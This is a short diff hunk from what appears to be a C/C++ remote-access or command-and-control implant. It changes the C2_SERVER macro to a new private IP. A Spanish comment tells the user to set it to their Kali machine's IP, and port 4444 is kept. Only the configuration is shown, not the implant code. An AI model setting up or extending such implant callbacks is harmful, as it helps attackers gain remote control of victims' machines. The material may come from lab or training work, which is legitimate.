@@ -49,7 +49,7 @@
 // CONFIGURACIÓN - EDITAR EN BUILDER
 // ============================================================================
 #ifndef C2_SERVER
-#define C2_SERVER "192.168.1.100"  // CAMBIA ESTO A TU IP DE KALI
+#define C2_SERVER "192.168.254.137"  // CAMBIA ESTO A TU IP DE KALI
 #endif
 #ifndef C2_PORT
 #define C2_PORT 4444
